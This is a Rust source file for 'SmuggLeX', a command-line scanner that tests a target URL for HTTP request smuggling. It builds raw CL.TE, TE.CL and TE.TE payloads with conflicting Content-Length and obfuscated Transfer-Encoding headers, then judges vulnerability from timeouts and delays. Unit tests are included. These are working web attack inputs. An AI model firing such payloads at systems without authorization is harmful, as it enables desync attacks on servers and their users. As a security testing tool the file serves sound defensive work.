use clap::Parser;
use colored::*;
use indicatif::{ProgressBar, ProgressStyle};
use rustls::pki_types::ServerName;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::fs;
use std::io::Write;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;
use url::Url;
use chrono::Utc;
use once_cell::sync::Lazy;

// Detection thresholds
const TIMING_MULTIPLIER: u128 = 3; // Flag if response is 3x slower than baseline
const MIN_DELAY_MS: u128 = 1000;   // Minimum delay to consider (1 second)

// Lazy static TLS configuration to avoid recreating for each request
static TLS_CONFIG: Lazy<Arc<rustls::ClientConfig>> = Lazy::new(|| {
    let mut root_store = rustls::RootCertStore::empty();
    root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    
    Arc::new(
        rustls::ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth()
    )
});

/// HTTP Request Smuggling tester
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Target URL
    #[arg(required = true)]
    url: String,

    /// Custom method for the attack request
    #[arg(short, long, default_value = "POST")]
    method: String,

    /// Socket timeout in seconds
    #[arg(short, long, default_value_t = 10)]
    timeout: u64,

    /// Verbose mode
    #[arg(short, long, action = clap::ArgAction::SetTrue)]
    verbose: bool,

    /// Output file for results (JSON format)
    #[arg(short, long)]
    output: Option<String>,

    /// Custom headers (format: "Header: Value")
    #[arg(short = 'H', long = "header")]
    headers: Vec<String>,

    /// Specify which checks to run (comma-separated: cl-te,te-cl,te-te)
    #[arg(short = 'c', long = "checks")]
    checks: Option<String>,
}

/// Result of a vulnerability check
#[derive(Debug, Serialize, Deserialize)]
struct CheckResult {
    check_type: String,
    vulnerable: bool,
    payload_index: Option<usize>,
    normal_status: String,
    attack_status: Option<String>,
    normal_duration_ms: u64,
    attack_duration_ms: Option<u64>,
    timestamp: String,
}

/// Overall scan results
#[derive(Debug, Serialize, Deserialize)]
struct ScanResults {
    target: String,
    method: String,
    timestamp: String,
    checks: Vec<CheckResult>,
}

/// Parameters for running vulnerability checks
struct CheckParams<'a> {
    pb: &'a ProgressBar,
    check_name: &'a str,
    host: &'a str,
    port: u16,
    path: &'a str,
    attack_requests: Vec<String>,
    timeout: u64,
    verbose: bool,
    use_tls: bool,
}

/// Sends a raw HTTP request and returns the response and duration.
async fn send_request(
    host: &str,
    port: u16,
    request: &str,
    timeout: u64,
    verbose: bool,
    use_tls: bool,
) -> Result<(String, Duration), Box<dyn Error>> {
    if verbose {
        println!("\n{}", "--- REQUEST ---".bold().blue());
        println!("{}", request.cyan());
    }

    let addr = format!("{}:{}", host, port);
    let start = Instant::now();
    
    let response_str = if use_tls {
        let connector = TlsConnector::from(Arc::clone(&TLS_CONFIG));
        let stream = TcpStream::connect(&addr).await?;
        let domain = ServerName::try_from(host.to_string())?;
        let mut tls_stream = connector.connect(domain, stream).await?;
        
        tls_stream.write_all(request.as_bytes()).await?;
        
        let mut buf = Vec::new();
        tokio::time::timeout(Duration::from_secs(timeout), tls_stream.read_to_end(&mut buf)).await??;
        String::from_utf8_lossy(&buf).to_string()
    } else {
        let mut stream = TcpStream::connect(&addr).await?;
        stream.write_all(request.as_bytes()).await?;
        
        let mut buf = Vec::new();
        tokio::time::timeout(Duration::from_secs(timeout), stream.read_to_end(&mut buf)).await??;
        String::from_utf8_lossy(&buf).to_string()
    };
    
    let duration = start.elapsed();
    
    if verbose {
        println!("\n{}", "--- RESPONSE ---".bold().blue());
        println!("{}", response_str.white());
    }

    Ok((response_str, duration))
}

/// Runs a set of attack requests for a given check type.
async fn run_checks_for_type(params: CheckParams<'_>) -> Result<CheckResult, Box<dyn Error>> {
    if !params.verbose {
        params.pb.set_message(format!("Checking for {}...", params.check_name));
    } else {
        println!("\n{}", format!("[!] Checking for {} vulnerability", params.check_name).bold());
    }
    
    let (normal_response, normal_duration) = send_request(params.host, params.port, &format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        params.path, params.host
    ), params.timeout, params.verbose, params.use_tls).await?;
    let normal_status = normal_response.lines().next().unwrap_or("").to_string();

    let mut vulnerable = false;
    let mut result_payload_index = None;
    let mut result_attack_status = None;
    let mut last_attack_duration = None;
    
    // Threshold for detecting timing-based smuggling
    let timing_threshold = normal_duration.as_millis() * TIMING_MULTIPLIER;
    
    for (i, attack_request) in params.attack_requests.iter().enumerate() {
        match send_request(params.host, params.port, attack_request, params.timeout, params.verbose, params.use_tls).await {
            Ok((attack_response, attack_duration)) => {
                last_attack_duration = Some(attack_duration);
                let attack_status_line = attack_response.lines().next().unwrap_or("");
                let attack_millis = attack_duration.as_millis();
                
                // Extract HTTP status code from status line (e.g., "HTTP/1.1 504 Gateway Timeout")
                let status_code = attack_status_line
                    .split_whitespace()
                    .nth(1)
                    .and_then(|code| code.parse::<u16>().ok());
                
                // Check for smuggling indicators:
                // 1. Timeout status codes (408 Request Timeout, 504 Gateway Timeout)
                // 2. Significantly delayed response (3x+ slower than baseline AND exceeds minimum threshold)
                let is_timeout_error = matches!(status_code, Some(408) | Some(504));
                let is_delayed = attack_millis > timing_threshold && attack_millis > MIN_DELAY_MS;
                
                if is_timeout_error || is_delayed {
                    vulnerable = true;
                    result_payload_index = Some(i);
                    result_attack_status = Some(attack_status_line.to_string());
                    
                    let result_text = format!("[!] {} Result:", params.check_name);
                    let vulnerable_text = "[!!!] VULNERABLE".red().bold();
                    let reason = if is_timeout_error {
                        "Timeout status code detected (408/504)"
                    } else {
                        "Excessive delay detected (possible desync)"
                    };
                    
                    if params.verbose {
                        println!("\n{}", result_text.bold());
                        println!("  {}", vulnerable_text);
                        println!("  {} Reason: {}", "[+] ".green(), reason.yellow());
                        println!("  {} Payload index: {}", "[+] ".green(), i);
                        println!("  {} Normal response: {} (took {:.2?})", "[+] ".green(), normal_status, normal_duration);
                        println!("  {} Attack response: {} (took {:.2?})", "[+] ".green(), attack_status_line, attack_duration);
                    } else {
                        params.pb.println(format!("\n{}", result_text.bold()));
                        params.pb.println(format!("  {}", vulnerable_text));
                        params.pb.println(format!("  {} Reason: {}", "[+] ".green(), reason.yellow()));
                        params.pb.println(format!("  {} Payload index: {}", "[+] ".green(), i));
                        params.pb.println(format!("  {} Normal response: {} (took {:.2?})", "[+] ".green(), normal_status, normal_duration));
                        params.pb.println(format!("  {} Attack response: {} (took {:.2?})", "[+] ".green(), attack_status_line, attack_duration));
                    }
                    break;
                }
            }
            Err(e) => {
                // Check if error is a timeout error type
                let is_timeout = e.source()
                    .map(|source| {
                        let source_str = source.to_string();
                        source_str.contains("timed out") || source_str.contains("timeout")
                    })
                    .unwrap_or_else(|| {
                        let error_str = e.to_string();
                        error_str.contains("timed out") || error_str.contains("timeout")
                    });
                
                if is_timeout {
                    vulnerable = true;
                    result_payload_index = Some(i);
                    result_attack_status = Some("Connection Timeout".to_string());
                    last_attack_duration = Some(Duration::from_secs(params.timeout));
                    
                    let result_text = format!("[!] {} Result:", params.check_name);
                    let vulnerable_text = "[!!!] VULNERABLE".red().bold();
                    if params.verbose {
                        println!("\n{}", result_text.bold());
                        println!("  {}", vulnerable_text);
                        println!("  {} Reason: {}", "[+] ".green(), "Connection timeout (desync hang detected)".yellow());
                        println!("  {} Payload index: {}", "[+] ".green(), i);
                        println!("  {} Normal response: {} (took {:.2?})", "[+] ".green(), normal_status, normal_duration);
                        println!("  {} Attack request timed out after {:.2?}", "[+] ".green(), Duration::from_secs(params.timeout));
                    } else {
                        params.pb.println(format!("\n{}", result_text.bold()));
                        params.pb.println(format!("  {}", vulnerable_text));
                        params.pb.println(format!("  {} Reason: {}", "[+] ".green(), "Connection timeout (desync hang detected)".yellow()));
                        params.pb.println(format!("  {} Payload index: {}", "[+] ".green(), i));
                        params.pb.println(format!("  {} Normal response: {} (took {:.2?})", "[+] ".green(), normal_status, normal_duration));
                        params.pb.println(format!("  {} Attack request timed out after {:.2?}", "[+] ".green(), Duration::from_secs(params.timeout)));
                    }
                    break;
                } else {
                    let error_text = format!("\n{} Error during {} attack request (payload {}): {}", "[!] ".yellow(), params.check_name, i, e);
                    if params.verbose { println!("{}", error_text); } else { params.pb.println(error_text); }
                }
            }
        }
    }

    if !vulnerable {
        let result_text = format!("[!] {} Result:", params.check_name);
        let not_vulnerable_text = "[+] Not Vulnerable".green();
        if params.verbose {
            println!("\n{}", result_text.bold());
            println!("  {}", not_vulnerable_text);
        } else {
            params.pb.println(format!("\n{}", result_text.bold()));
            params.pb.println(format!("  {}", not_vulnerable_text));
        }
    }

    Ok(CheckResult {
        check_type: params.check_name.to_string(),
        vulnerable,
        payload_index: result_payload_index,
        normal_status,
        attack_status: result_attack_status,
        normal_duration_ms: normal_duration.as_millis() as u64,
        attack_duration_ms: last_attack_duration.map(|d| d.as_millis() as u64),
        timestamp: Utc::now().to_rfc3339(),
    })
}

fn get_cl_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

fn get_te_cl_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

fn get_te_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    let te_variations = vec![
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip, chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked, identity"),
    ];
    
    let mut payloads = Vec::new();
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, te1, te2
        ));
    }
    payloads
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let cli = Cli::parse();

    let url = Url::parse(&cli.url)?;
    let host = url.host_str().ok_or("Invalid host")?;
    let port = url.port_or_known_default().ok_or("Invalid port")?;
    let path = url.path();
    let method = &cli.method;
    let timeout = cli.timeout;
    let verbose = cli.verbose;
    let use_tls = url.scheme() == "https";
    
    // Parse checks filter
    let checks_to_run: Vec<&str> = if let Some(ref checks_str) = cli.checks {
        checks_str.split(',').map(|s| s.trim()).collect()
    } else {
        vec!["cl-te", "te-cl", "te-te"]
    };

    // Display banner
    println!();
    println!("{}", "╔═══════════════════════════════════════════╗".cyan());
    println!("{}", "║  SmuggLeX - HTTP Request Smuggling Tool  ║".cyan().bold());
    println!("{}", "╚═══════════════════════════════════════════╝".cyan());
    println!();
    println!("{} {}", "Target:".bold(), host.cyan());
    println!("{}   {}", "Method:".bold(), method.cyan());
    println!("{} {}", "Timeout:".bold(), format!("{}s", timeout).cyan());
    println!("{} {}", "Protocol:".bold(), if use_tls { "HTTPS".cyan() } else { "HTTP".cyan() });
    if !cli.headers.is_empty() {
        println!("{} {}", "Custom Headers:".bold(), cli.headers.len().to_string().cyan());
    }
    if verbose {
        println!("{} {}", "Verbose:".bold(), "Enabled".cyan());
    }
    if let Some(ref output_file) = cli.output {
        println!("{} {}", "Output:".bold(), output_file.cyan());
    }
    println!("{} {}", "Checks:".bold(), checks_to_run.join(", ").to_uppercase().cyan());
    println!();

    let pb = ProgressBar::new_spinner();
    if !verbose {
        pb.enable_steady_tick(Duration::from_millis(120));
        pb.set_style(
            ProgressStyle::with_template("{spinner:.blue} {msg}")
                .unwrap()
                .tick_strings(&[
                    "▸▹▹▹▹",
                    "▹▸▹▹▹",
                    "▹▹▸▹▹",
                    "▹▹▹▸▹",
                    "▹▹▹▹▸",
                ]),
        );
    } else {
        pb.finish_and_clear();
    }

    let mut results = Vec::new();

    // Run CL.TE check if enabled
    if checks_to_run.contains(&"cl-te") {
        let cl_te_payloads = get_cl_te_payloads(path, host, method, &cli.headers);
        let result = run_checks_for_type(CheckParams {
            pb: &pb,
            check_name: "CL.TE",
            host,
            port,
            path,
            attack_requests: cl_te_payloads,
            timeout,
            verbose,
            use_tls,
        }).await?;
        results.push(result);
        pb.inc(1);
    }

    // Run TE.CL check if enabled
    if checks_to_run.contains(&"te-cl") {
        let te_cl_payloads = get_te_cl_payloads(path, host, method, &cli.headers);
        let result = run_checks_for_type(CheckParams {
            pb: &pb,
            check_name: "TE.CL",
            host,
            port,
            path,
            attack_requests: te_cl_payloads,
            timeout,
            verbose,
            use_tls,
        }).await?;
        results.push(result);
        pb.inc(1);
    }

    // Run TE.TE check if enabled
    if checks_to_run.contains(&"te-te") {
        let te_te_payloads = get_te_te_payloads(path, host, method, &cli.headers);
        let result = run_checks_for_type(CheckParams {
            pb: &pb,
            check_name: "TE.TE",
            host,
            port,
            path,
            attack_requests: te_te_payloads,
            timeout,
            verbose,
            use_tls,
        }).await?;
        results.push(result);
        pb.inc(1);
    }

    if !verbose {
        pb.finish_with_message(format!("{} {}", "✔".green(), "Checks finished!".bold()));
    } else {
        println!("\n{}", "✔ Checks finished!".bold().green());
    }

    // Print summary
    println!("\n{}", "=== SCAN SUMMARY ===".bold());
    let vulnerable_count = results.iter().filter(|r| r.vulnerable).count();
    
    if vulnerable_count > 0 {
        println!("{} {} vulnerability(ies) found!", "⚠".red().bold(), vulnerable_count);
        for result in &results {
            if result.vulnerable {
                println!("  {} {}: {}", "•".red(), result.check_type, "VULNERABLE".red().bold());
            }
        }
    } else {
        println!("{} No vulnerabilities detected", "✔".green().bold());
    }
    println!("{} {} checks completed", "✔".green(), results.len());

    // Save results to file if requested
    if let Some(output_file) = cli.output {
        let scan_results = ScanResults {
            target: cli.url.clone(),
            method: method.clone(),
            timestamp: Utc::now().to_rfc3339(),
            checks: results,
        };
        
        let json_output = serde_json::to_string_pretty(&scan_results)?;
        let mut file = fs::File::create(&output_file)?;
        file.write_all(json_output.as_bytes())?;
        
        println!("\n{} Results saved to: {}", "✔".green().bold(), output_file.cyan());
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cl_te_payloads_generation() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 6);
        
        // Check that all payloads contain required components
        for payload in &payloads {
            assert!(payload.contains("Content-Length: 6"));
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("POST /test HTTP/1.1"));
            assert!(payload.contains("Host: example.com"));
        }
    }

    #[test]
    fn test_te_cl_payloads_generation() {
        let payloads = get_te_cl_payloads("/api", "target.com", "GET", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 6);
        
        for payload in &payloads {
            assert!(payload.contains("Content-Length: 4"));
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("GET /api HTTP/1.1"));
        }
    }

    #[test]
    fn test_te_te_payloads_generation() {
        let payloads = get_te_te_payloads("/", "site.com", "POST", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 4);
        
        for payload in &payloads {
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("POST / HTTP/1.1"));
        }
    }

    #[test]
    fn test_custom_headers_integration() {
        let custom_headers = vec![
            "X-Custom-Header: value1".to_string(),
            "Authorization: Bearer token".to_string(),
        ];
        
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &custom_headers);
        
        for payload in &payloads {
            assert!(payload.contains("X-Custom-Header: value1"));
            assert!(payload.contains("Authorization: Bearer token"));
        }
    }

    #[test]
    fn test_check_result_serialization() {
        let result = CheckResult {
            check_type: "CL.TE".to_string(),
            vulnerable: false,
            payload_index: None,
            normal_status: "HTTP/1.1 200 OK".to_string(),
            attack_status: None,
            normal_duration_ms: 150,
            attack_duration_ms: None,
            timestamp: "2024-01-01T12:00:00Z".to_string(),
        };
        
        let json = serde_json::to_string(&result);
        assert!(json.is_ok());
        
        let deserialized: Result<CheckResult, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());
    }
}